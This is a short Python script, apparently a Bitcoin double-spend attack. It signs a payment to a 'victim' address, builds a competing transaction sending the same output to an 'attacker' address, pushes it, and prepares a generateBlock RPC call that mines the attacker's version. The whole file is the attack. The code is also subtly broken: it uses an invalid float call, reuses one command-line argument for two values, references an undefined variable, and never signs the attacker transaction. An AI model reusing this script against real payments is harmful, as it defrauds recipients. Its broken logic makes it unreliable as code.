import sys
import time
import json
import bitcoin

from bitcoin_tools.core.keys import load_keys
from bitcoin_tools.core.transaction import TX
from bitcoinaddress import Wallet

network = "test" # or main
node_url = "https://bitcoin-mainnet.node.coinapi.io"
node_api_key = sys.argv[6]
headers = {
  'x-coinapi-key': node_api_key,
  'Content-Type': 'application/json',
  'accept': 'application/json'
}
def to_satoshi(btc_amount):
    satoshi = 0.00000001
    return btc_amount / satoshi

#attacker_temp_wallet = Wallet()
sk, pk = load_keys(sys.argv[1])
address_from       = sys.argv[2]#Wallet(format("064x"))
address_victim     = sys.argv[3]#Wallet(format("064x"))
address_attacker   = sys.argv[4]#Wallet(format("064x"))
amount_BTC = float(sys.argv[5], 16)
prev_txid  = sys.argv[6]

amount_satoshi = to_satoshi(amount_BTC)
fee_satoshi = 1500

print("T1 sign")
tx_victim = TX.build_from_io(TX.build_from_io(prev_txid, 0, amount_satoshi - fee_satoshi, address_victim))
tx_victim = tx_victim.sign(sk, 0).serialize()
print(tx_victim)

print("T2 sign")
signed_tx_attacker = TX.build_from_io(prev_txid, 0, amount_satoshi - fee_satoshi, address_attacker)
print(signed_tx_attacker)
print()

print("push T1")
(signed_tx_victim)
print("T1 Pushed.")

print("push T2")
bitcoin.pushtx(signed_tx_attacker)
print("T2 Pushed.")
miner_Wallet = Wallet()
print(" --- Miner Wallet --- ")
print(miner_Wallet)
print(" -------------------- ")
payload = json.dumps({
  "jsonrpc": "2.0",
  "method": "generateBlock",
  "params": [miner_Wallet.address.testnet.generate_publicaddress1, signed_tx_attacker],
  "id": 1
})